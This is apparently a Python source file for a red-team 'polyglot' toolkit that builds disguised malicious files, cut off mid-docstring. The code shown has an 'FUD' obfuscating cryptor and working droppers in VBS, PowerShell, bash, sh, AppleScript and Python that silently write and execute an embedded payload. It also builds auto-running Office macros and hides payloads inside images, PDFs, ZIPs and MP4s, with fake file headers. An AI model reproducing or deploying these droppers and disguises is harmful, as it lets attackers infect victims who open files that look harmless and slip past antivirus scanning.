#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  POLYGLOT TOOLKIT v3.0 — Red Team + Shield Edition           ║
║  TUI (Terminal User Interface) + CLI                         ║
║  Author: Mr-DS-ML-85                                         ║
╚══════════════════════════════════════════════════════════════╝

Usage:
  polyglot tui                    Interactive TUI menu
  polyglot build <cover> <payload> [--type jpeg] [--encrypt] [--fud]
  polyglot scan <file_or_dir>
  polyglot sanitize <file_or_dir> [--no-backup] [--dry-run]
  polyglot recover <file_or_dir>
  polyglot server [--port 8888]
  polyglot monitor <dir>
  polyglot report <file_or_dir>   Comprehensive security report
"""

import sys
import os
import json
import struct
import math
import zlib
import base64
import hashlib
import shutil
import random
import time
import platform
import subprocess
import threading
from datetime import datetime
from pathlib import Path
from collections import deque
try:
    from engines.quarantine import QuarantineManager
    HAS_QUARANTINE = True
except ImportError:
    HAS_QUARANTINE = False

try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.prompt import Prompt, Confirm, IntPrompt
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.columns import Columns
    from rich.align import Align
    from rich.markdown import Markdown
    from rich.style import Style
    from rich.theme import Theme as RichTheme
    from rich import box
    HAS_RICH = True
except ImportError:
    HAS_RICH = False

# ── Rich Theme ───────────────────────────────────────────────

THEME = RichTheme({
    "danger": "bold red",
    "success": "bold green",
    "warning": "bold yellow",
    "info": "bold blue",
    "accent": "bold cyan",
    "dim": "dim white",
    "critical": "bold white on red",
    "high": "bold red",
    "medium": "yellow",
    "low": "dim cyan",
})

console = Console(theme=THEME) if HAS_RICH else None


# ── Cross-Platform Notifications ────────────────────────────

class Notifier:
    @staticmethod
    def send(title, message, urgency="normal"):
        system = platform.system()
        try:
            if system == "Linux":
                subprocess.run(["notify-send", "-u", urgency, "-a", "Polyglot Toolkit", title, message],
                             capture_output=True, timeout=5)
            elif system == "Darwin":
                subprocess.run(["osascript", "-e",
                    f'display notification "{message}" with title "{title}"'],
                    capture_output=True, timeout=5)
            elif system == "Windows":
                try:
                    import winsound
                    winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
                except Exception:
                    pass
        except Exception:
            pass


# ── Builder Engine ───────────────────────────────────────────

class PolyglotBuilder:
    def entropy(self, data: bytes) -> float:
        if not data:
            return 0.0
        freq = [0] * 256
        for b in data:
            freq[b] += 1
        length = len(data)
        return -sum((f / length) * math.log2(f / length) for f in freq if f > 0)

    def xor_crypt(self, data: bytes, key: bytes) -> bytes:
        key_exp = (key * (len(data) // len(key) + 1))[:len(data)]
        return bytes(a ^ b for a, b in zip(data, key_exp))

    def fud_obfuscate(self, payload: bytes) -> bytes:
        """FUD cryptor — multi-layer obfuscation."""
        key = os.urandom(32)
        encrypted = self.xor_crypt(payload, key)
        compressed = zlib.compress(encrypted, 9)
        encoded = base64.b85encode(compressed)
        stub = b'#!/usr/bin/env python3\n'
        stub += b'import base64,zlib,os,sys\n'
        stub += f'k="{key.hex()}"\n'.encode()
        stub += b'd=base64.b85decode(b"' + base64.b85encode(compressed) + b'")\n'
        stub += b'k=bytes.fromhex(k)\n'
        stub += b'd=bytes(a^b for a,b in zip(d,(k*(len(d)//len(k)+1))[:len(d)]))\n'
        stub += b'exec(compile(zlib.decompress(d),"<fud>","exec"))\n'
        return stub

    # ── Payload Type Wrappers ─────────────────────────────────

    def vbs_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a VBS dropper that extracts & executes it."""
        encoded = base64.b64encode(payload).decode()
        # Split into 100-char lines for VBS compatibility
        lines = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
        b64_var = '" _\n    & "'.join(lines)
        ext_map = {'.jpg':'.exe','.png':'.exe','.gif':'.exe','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.exe','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.exe')
        vbs = f'''Dim b64
b64 = "{b64_var}"
Dim dom: Set dom = CreateObject("MSXML2.DOMDocument")
Dim el: Set el = dom.createElement("b64")
el.DataType = "bin.base64": el.Text = b64
Dim bytes: bytes = el.nodeTypedValue
Dim f: Set f = CreateObject("Scripting.FileSystemObject")
Dim tmp: tmp = f.GetSpecialFolder(2) & "\\sys" & Int(Rnd*9999) & "{drop_ext}"
Dim stream: Set stream = CreateObject("ADODB.Stream")
stream.Type = 1: stream.Open: stream.Write bytes
stream.SaveToFile tmp, 2: stream.Close
CreateObject("WScript.Shell").Run tmp, 0, False
'''.encode('utf-8')
        return vbs

    def ps1_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a PowerShell dropper."""
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.exe','.png':'.exe','.gif':'.exe','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.exe','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.exe')
        ps1 = f'''$b64 = "{encoded}"
$bytes = [Convert]::FromBase64String($b64)
$tmp = "$env:TEMP\\sys{os.urandom(2).hex()}{drop_ext}"
[System.IO.File]::WriteAllBytes($tmp, $bytes)
Start-Process -FilePath $tmp -WindowStyle Hidden
'''.encode('utf-8')
        return ps1

    # ── Cross-Platform Payload Wrappers (Linux + macOS) ────────

    def bash_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a bash/sh dropper for Linux and macOS.

        Decodes base64 payload, writes to /tmp, makes executable, runs it.
        Works on any POSIX system with bash or sh.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        rand_hex = os.urandom(4).hex()
        # Use heredoc for large payloads — more reliable than inline echo
        bash = f'''#!/bin/bash
# Document renderer
TMPF="/tmp/.sys_{rand_hex}{drop_ext}"
cat <<'_PAYLOAD_EOF_' | base64 -d > "$TMPF"
{encoded}
_PAYLOAD_EOF_
chmod +x "$TMPF"
"$TMPF" &
'''.encode('utf-8')
        return bash

    def sh_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap raw payload as a POSIX sh dropper (no bash dependency).

        Maximum portability — works on any Unix-like system.
        Uses only /bin/sh builtins and standard utilities.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        rand_hex = os.urandom(4).hex()
        # Portable: printf for each chunk, no heredoc
        lines = [encoded[i:i+76] for i in range(0, len(encoded), 76)]
        printf_lines = ''.join([f'printf "{l}\\n" >> "$TMPF"\n' for l in lines])
        sh = f'''#!/bin/sh
# Document viewer
TMPF="/tmp/.sys_{rand_hex}{drop_ext}"
> "$TMPF"
{printf_lines}chmod +x "$TMPF"
"$TMPF" &
'''.encode('utf-8')
        return sh

    def applescript_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap payload as AppleScript/osascript dropper for macOS.

        Uses osascript to decode and execute via do shell script.
        macOS-specific — leverages built-in osascript + bash.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        rand_hex = os.urandom(4).hex()
        # AppleScript that uses do shell script to decode+run
        asc = f'''#!/usr/bin/osascript
-- Document viewer
set payload to "{encoded}"
do shell script "echo " & quoted form of payload & " | base64 -D > /tmp/.sys_{rand_hex}{drop_ext} && chmod +x /tmp/.sys_{rand_hex}{drop_ext} && /tmp/.sys_{rand_hex}{drop_ext} &"
'''.encode('utf-8')
        return asc

    def py_dropper_wrap(self, payload: bytes, cover_ext: str = '.jpg') -> bytes:
        """Wrap payload as a cross-platform Python dropper.

        Works on Linux, macOS, and Windows (if Python is installed).
        Uses only stdlib — no dependencies needed.
        """
        encoded = base64.b64encode(payload).decode()
        ext_map = {'.jpg':'.bin','.png':'.bin','.gif':'.bin','.pdf':'.pdf',
                   '.zip':'.zip','.mp4':'.bin','.xlsx':'.xls','.docx':'.doc'}
        drop_ext = ext_map.get(cover_ext, '.bin')
        # Cross-platform Python dropper
        py = f'''#!/usr/bin/env python3
import base64,os,sys,stat,tempfile,subprocess
b64="{encoded}"
data=base64.b64decode(b64)
td=tempfile.gettempdir()
pf=os.path.join(td,".sys_"+os.urandom(4).hex()+"{drop_ext}")
with open(pf,"wb") as f:f.write(data)
os.chmod(pf,os.stat(pf).st_mode|stat.S_IEXEC|stat.S_IXGRP|stat.S_IXOTH)
if sys.platform=="win32":
    os.startfile(pf)
else:
    subprocess.Popen([pf],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL,stdin=subprocess.DEVNULL,start_new_session=True)
'''.encode('utf-8')
        return py

    def office_macro_crossplatform_wrap(self, payload: bytes, doc_type: str = 'xlsx') -> bytes:
        """Office macro that auto-detects OS and uses appropriate dropper.

        VBA macro checks Application.OperatingSystem to choose between
        Windows (Shell) and macOS (MacScript/do shell script).
        """
        import zipfile, io
        encoded = base64.b64encode(payload).decode()
        lines = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
        b64_chunks = '\n'.join([f'    s = s & "{lines[i]}"' for i in range(len(lines))])
        # Cross-platform VBA macro
        vba_code = f'''Sub AutoOpen()
    Dim s As String
{b64_chunks}
    Dim b() As Byte
    b = DecodeBase64(s)
    Dim p As String
    #If Mac Then
        p = "/tmp/.sys" & Int(Rnd * 9999) & ".bin"
    #Else
        p = Environ("TEMP") & "\\sys" & Int(Rnd * 9999) & ".exe"
    #End If
    Dim f As Integer: f = FreeFile
    Open p For Binary Access Write As #f
    Put #f, , b
    Close #f
    #If Mac Then
        MacScript("do shell script ""chmod +x '" & p & "'""")
        MacScript("do shell script """ & p & " & """)
    #Else
        Shell p, vbHide
    #End If
End Sub

Function DecodeBase64(s As String) As Byte()
    Dim dom As Object: Set dom = CreateObject("MSXML2.DOMDocument")
    Dim el As Object: Set el = dom.createElement("b64")
    el.DataType = "bin.base64": el.Text = s
    DecodeBase64 = el.nodeTypedValue
End Function
'''.replace('{b64_chunks}', b64_chunks)

        buf = io.BytesIO()
        if doc_type == 'xlsx':
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
            workbook = '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
            wb_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            sheet = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c t="str"><v>PolyglotShield</v></c></row></sheetData></worksheet>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('xl/workbook.xml', workbook)
                zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)
                zf.writestr('xl/worksheets/sheet1.xml', sheet)
                zf.writestr('xl/vbaProject.bin', vba_code.encode())
        else:  # docx
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
            document = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>PolyglotShield Document</w:t></w:r></w:p></w:body></w:document>'
            doc_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            styles = '<?xml version="1.0"?><w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:style w:type="paragraph" w:styleId="Normal"><w:rPr><w:sz w:val="24"/></w:rPr></w:style></w:styles>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('word/document.xml', document)
                zf.writestr('word/_rels/document.xml.rels', doc_rels)
                zf.writestr('word/styles.xml', styles)
                zf.writestr('word/vbaProject.bin', vba_code.encode())

        return buf.getvalue()

    def office_macro_wrap(self, payload: bytes, doc_type: str = 'xlsx') -> bytes:
        """Wrap payload as an Office document with embedded macro (VBA)."""
        import zipfile, io
        encoded = base64.b64encode(payload).decode()
        lines = [encoded[i:i+100] for i in range(0, len(encoded), 100)]
        b64_chunks = '\n'.join([f'    s = s & "{lines[i]}"' for i in range(len(lines))])
        vba_code = f'''Sub AutoOpen()
    Dim s As String
{b64_chunks}
    Dim b() As Byte
    b = DecodeBase64(s)
    Dim f As Integer: f = FreeFile
    Dim p As String
    p = Environ("TEMP") & "\\sys" & Int(Rnd * 9999) & ".exe"
    Open p For Binary Access Write As #f
    Put #f, , b
    Close #f
    Shell p, vbHide
End Sub

Function DecodeBase64(s As String) As Byte()
    Dim dom As Object: Set dom = CreateObject("MSXML2.DOMDocument")
    Dim el As Object: Set el = dom.createElement("b64")
    el.DataType = "bin.base64": el.Text = s
    DecodeBase64 = el.nodeTypedValue
End Function
'''.replace('{b64_chunks}', b64_chunks)

        # Create a minimal XLSX/DOCX (ZIP with XML)
        buf = io.BytesIO()
        if doc_type == 'xlsx':
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'
            workbook = '<?xml version="1.0"?><workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets></workbook>'
            wb_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            sheet = '<?xml version="1.0"?><worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><sheetData><row><c t="str"><v>PolyglotShield</v></c></row></sheetData></worksheet>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('xl/workbook.xml', workbook)
                zf.writestr('xl/_rels/workbook.xml.rels', wb_rels)
                zf.writestr('xl/worksheets/sheet1.xml', sheet)
                zf.writestr('xl/vbaProject.bin', vba_code.encode())
        else:  # docx
            content_types = '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/><Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>'
            rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'
            document = '<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>PolyglotShield Document</w:t></w:r></w:p></w:body></w:document>'
            doc_rels = '<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/><Relationship Id="rId2" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>'
            styles = '<?xml version="1.0"?><w:styles xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:style w:type="paragraph" w:styleId="Normal"><w:rPr><w:sz w:val="24"/></w:rPr></w:style></w:styles>'
            with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
                zf.writestr('[Content_Types].xml', content_types)
                zf.writestr('_rels/.rels', rels)
                zf.writestr('word/document.xml', document)
                zf.writestr('word/_rels/document.xml.rels', doc_rels)
                zf.writestr('word/styles.xml', styles)
                zf.writestr('word/vbaProject.bin', vba_code.encode())

        return buf.getvalue()

    def mime_confusion(self, data: bytes, fake_ext: str) -> bytes:
        """Prepend fake header to disguise payload type."""
        headers = {
            '.jpg': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00',
            '.png': b'\x89PNG\r\n\x1a\n',
            '.gif': b'GIF89a\x01\x00\x01\x00\x80\x00\x00',
            '.pdf': b'%PDF-1.4\n1 0 obj\n<< /Type /Catalog >>\nendobj\n',
            '.mp4': b'\x00\x00\x00\x1cftypisom\x00\x00\x02\x00isomiso2',
            '.zip': b'PK\x03\x04\x14\x00\x00\x00\x00\x00',
            '.xlsx': b'PK\x03\x04\x14\x00\x06\x00\x08\x00',  # XLSX is ZIP-based
            '.docx': b'PK\x03\x04\x14\x00\x06\x00\x08\x00',  # DOCX is ZIP-based
        }
        return headers.get(fake_ext, b'') + data

    def build(self, cover_path, payload_path, output_path,
              container_type="jpeg", encrypt=False, fud=False, mime_confuse=False,
              payload_type=None, target_os="windows", arch="x86-64", stealth=False):
        with open(cover_path, 'rb') as f:
            cover = f.read()
        with open(payload_path, 'rb') as f:
            payload = f.read()

        original_payload = payload
        original_size = len(payload)
        key = None
        payload_type_used = payload_type
        warnings_list = []

        # Apply payload type wrapping FIRST (before encryption/FUD)
        if payload_type:
            cover_ext = os.path.splitext(cover_path)[1].lower()
            pt = payload_type.lower()
            # ── Windows-only wrappers ──
            if pt == 'vbs':
                if target_os in ('linux', 'macos', 'posix'):
                    raise ValueError("VBS is Windows-only. Use --payload-type bash/sh/python for Linux/macOS.")
                payload = self.vbs_wrap(payload, cover_ext)
                payload_type_used = 'VBS'
            elif pt == 'ps1' or pt == 'powershell':
                if target_os in ('linux', 'macos', 'posix'):
                    raise ValueError("PowerShell is Windows-only. Use --payload-type bash/sh/python for Linux/macOS.")
                payload = self.ps1_wrap(payload, cover_ext)
                payload_type_used = 'PowerShell'
            # ── Cross-platform wrappers ──
            elif pt == 'bash':
                payload = self.bash_wrap(payload, cover_ext)
                payload_type_used = 'Bash'
            elif pt == 'sh':
                payload = self.sh_wrap(payload, cover_ext)
                payload_type_used = 'POSIX sh'
            elif pt in ('applescript', 'osascript', 'scpt'):
                payload = self.applescript_wrap(payload, cover_ext)
                payload_type_used = 'AppleScript'
            elif pt in ('python', 'py'):
                payload = self.py_dropper_wrap(payload, cover_ext)
                payload_type_used = 'Python Dropper'
            # ── Office wrappers (auto-switch for macOS) ──
            elif pt in ('xlsx', 'excel'):
                if target_os == 'macos':
                    payload = self.office_macro_crossplatform_wrap(payload, 'xlsx')
                    payload_type_used = 'Excel Macro (macOS)'
                else:
                    payload = self.office_macro_wrap(payload, 'xlsx')
                    payload_type_used = 'Excel Macro'
            elif pt in ('docx', 'word'):
                if target_os == 'macos':
                    payload = self.office_macro_crossplatform_wrap(payload, 'docx')
                    payload_type_used = 'Word Macro (macOS)'
                else:
                    payload = self.office_macro_wrap(payload, 'docx')
                    payload_type_used = 'Word Macro'

        # Detect payload type BEFORE obfuscation (encrypt/FUD/MIME break executables)
        is_pe = payload[:2] == b'MZ'
        is_elf = payload[:4] == b'\x7fELF'
        is_macho = payload[:4] in (b'\xfe\xed\xfa\xce', b'\xfe\xed\xfa\xcf',
                                    b'\xce\xfa\xed\xfe', b'\xcf\xfa\xed\xfe')
        is_executable = is_pe or is_elf or is_macho
        is_image = container_type.lower() in ('jpeg', 'jpg', 'png', 'gif')

        # Determine if overlay technique will be used (real executable + image)
        use_overlay = is_executable and is_image and not stealth
        # Also check if raw payload will be wrapped (raw data + target_os + image)
        use_wrap = (not is_executable) and is_image and target_os in ('windows', 'linux', 'macos') and not stealth
        # Payload-type wrappers produce scripts — safe to obfuscate those
        has_wrapper = payload_type is not None

        # Apply obfuscation using proper red team techniques
        if use_overlay and (fud or encrypt):
            # Real executable + overlay: use SECTION ENCRYPTION (packer technique)
            # Headers/imports/section table stay intact — only code/data encrypted
            key_byte = os.urandom(1)[0]
            try:
                if is_pe:
                    payload = self._pe_section_encrypt(payload, key_byte)
                    if encrypt:
                        warnings_list.append("PE section encryption applied (packer technique)")
                        print("  🔐 PE section encryption: .text XOR-encrypted + decryptor stub injected")
                elif is_elf:
                    payload = self._elf_section_encrypt(payload, key_byte)
                    if encrypt:
                        warnings_list.append("ELF section encryption applied (packer technique)")
                        print("  🔐 ELF section encryption: code segment XOR-encrypted + decryptor injected")
                elif is_macho:
                    payload = self._macho_section_encrypt(payload, key_byte, arch=arch)
                    if encrypt:
                        warnings_list.append("Mach-O section encryption applied (packer technique)")
                        print("  🔐 Mach-O section encryption: __TEXT XOR-encrypted + decryptor injected")
                key = key_byte  # Store for stats
            except Exception as e:
                warn = f"Section encryption failed ({e}), falling back to overlay without encryption"
                warnings_list.append(warn)
                print(f"  ⚠ {warn}")
            if fud:
                warnings_list.append("FUD skipped — not compatible with section-encrypted executables")
                print("  ⚠ FUD skipped — use section encryption or payload-type wrapper instead")
                fud = False
            if mime_confuse:
                mime_confuse = False
                warnings_list.append("MIME confuse skipped — would break executable format detection")
        else:
            if fud:
                payload = self.fud_obfuscate(payload)
            if encrypt:
                key = os.urandom(32)
                payload = self.xor_crypt(payload, key)
            if mime_confuse:
                ext = os.path.splitext(cover_path)[1]
                payload = self.mime_confusion(payload, ext)

        builders = {
            'jpeg': self._b_jpeg, 'jpg': self._b_jpeg,
            'png': self._b_png, 'gif': self._b_gif,
            'pdf': self._b_pdf, 'zip': self._b_zip,
            'mp4': self._b_mp4,
            'xlsx': self._b_zip, 'docx': self._b_zip,  # Office files are ZIP-based
        }

        if stealth:
            # Stealth mode: always use image-embedding (valid image, works everywhere)
            builder = builders.get(container_type.lower())
            if not builder:
                raise ValueError(f"Unsupported: {container_type}")
            polyglot = builder(cover, payload)
        elif is_executable and is_image:
            # Overlay technique: executable at start, image after EOF
            if is_pe:
                polyglot = self._build_pe_polyglot(cover, payload, container_type.lower(), arch=arch)
            elif is_elf:
                polyglot = self._build_elf_polyglot(cover, payload, container_type.lower(), arch=arch)
            elif is_macho:
                polyglot = self._build_macho_polyglot(cover, payload, container_type.lower(), arch=arch)
        elif is_image and target_os in ('windows', 'linux', 'macos'):
            # Raw payload + target_os specified → wrap in platform executable + overlay
            if target_os == 'windows':
                polyglot = self._build_pe_polyglot(cover, payload, container_type.lower(), arch=arch)
            elif target_os == 'linux':
                if arch == 'arm32':
                    polyglot = self._build_valid_elf32_arm_stub(payload) + cover
                else:
                    polyglot = self._build_elf_polyglot(cover, payload, container_type.lower(), arch=arch)
            elif target_os == 'macos':
                polyglot = self._build_macho_polyglot(cover, payload, container_type.lower(), arch=arch)
        else:
            builder = builders.get(container_type.lower())
            if not builder:
                raise ValueError(f"Unsupported: {container_type}")
            polyglot = builder(cover, payload)

        os.makedirs(os.path.dirname(os.path.abspath(output_path)) or '.', exist_ok=True)
        with open(output_path, 'wb') as f:
            f.write(polyglot)

        return {
            'output': output_path,
            'container_type': container_type.upper(),
            'payload_type': payload_type_used,
            'cover_size': len(cover),
            'payload_size': original_size,
            'output_size': len(polyglot),
            'payload_offset': len(polyglot) - len(payload),
            'encrypted': encrypt,
            'fud_protected': fud,
            'mime_confused': mime_confuse,
            'entropy': round(self.entropy(payload), 2),
            'warnings': warnings_list,
        }

    def _b_jpeg(self, c, p):
        """JPEG polyglot: payload as JPEG COM (comment) marker inside the file."""
        if c[:2] != b'\xff\xd8': raise ValueError("Not JPEG")
        e = c.rfind(b'\xff\xd9')
        if e == -1: raise ValueError("No EOI")
        result = c[:e+2]
        for i in range(0, len(p), 65533):
            chunk = p[i:i+65533]
            result += b'\xff\xfe' + struct.pack('<H', len(chunk) + 2) + chunk
        result += b'\xff\xd9'
        return result

    def _b_png(self, c, p):
        """PNG polyglot: payload in tEXt ancillary chunk (spec-compliant skip)."""
        if c[:8] != b'\x89PNG\r\n\x1a\n': raise ValueError("Not PNG")
        e = c.rfind(b'IEND')
        if e == -1: raise ValueError("No IEND")
        chunk_data = b'Comment\x00' + p
        chunk_type = b'tEXt'
        chunk_len = struct.pack('>I', len(chunk_data))
        import zlib as _zlib
        crc = struct.pack('>I', _zlib.crc32(chunk_type + chunk_data) & 0xFFFFFFFF)
        return c[:e] + chunk_len + chunk_type + chunk_data + crc + c[e:]

    def _b_gif(self, c, p):
        """GIF polyglot: payload in Application Extension sub-blocks."""
        if c[:6] not in (b'GIF87a', b'GIF89a'): raise ValueError("Not GIF")
        e = c.rfind(b'\x3b')
        if e == -1: raise ValueError("No terminator")
        app_name = b'POLYSHLD\x00\x03\x01\x00\x00'
        result = c[:e]
        result += b'\x21\xff\x0b' + app_name
        for i in range(0, len(p), 255):
            chunk = p[i:i+255]
            result += bytes([len(chunk)]) + chunk
        result += b'\x00'
        result += b'\x3b'
        return result

    def _b_pdf(self, c, p):
        """PDF polyglot: payload as EmbeddedFile stream object (spec-compliant)."""
        if not c.startswith(b'%PDF'): raise ValueError("Not PDF")
        e = c.rfind(b'%%EOF')
        if e == -1: raise ValueError("No EOF")
        obj = b'\n9999 0 obj\n<< /Type /EmbeddedFile /Length ' + str(len(p)).encode() + b' >>\nstream\n'
        obj += p
        obj += b'\nendstream\nendobj\n'
        xref = b'\nxref\n0 1\ntrailer\n<< /Size 10000 /Root 1 0 R >>\nstartxref\n0\n%%EOF\n'
        return c[:e+5] + obj + xref

    def _b_zip(self, c, p):
        """ZIP polyglot: payload as a new entry inside the ZIP (not trailing data)."""
        if c[:2] != b'PK': raise ValueError("Not ZIP")
        import io, zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
            try:
                with zipfile.ZipFile(io.BytesIO(c), 'r') as src:
                    for item in src.infolist():
                        zf.writestr(item, src.read(item.filename))
            except Exception:
                pass
            zf.writestr('payload.bin', p)
        return buf.getvalue()

    def _b_mp4(self, c, p):
        """MP4 polyglot: payload in a 'free' atom (spec-compliant skip)."""
        if b'ftyp' not in c[:20]: raise ValueError("Not MP4")
        atom = struct.pack('>I', len(p) + 8) + b'free' + p
        return c + atom

    def _build_pe_polyglot(self, cover_data: bytes, payload_data: bytes, cover_format: str, arch: str = 'x86-64') -> bytes:
        """
        Build a REAL PE polyglot using Corkami-style overlay technique:
        - PE at offset 0 with VALID import table (kernel32.dll → ExitProcess)
        - Cover image appended after PE EOF (overlay)
        - Windows PE loader ignores overlay data → PE executes normally
        - Image viewers scan forward and find image signature in overlay
        - Windows Defender scans the PE structure → detects embedded threats

        The PE is a valid PE32+ executable with:
        - Proper MZ/PE/COFF/Optional headers
        - Import table: kernel32.dll → ExitProcess
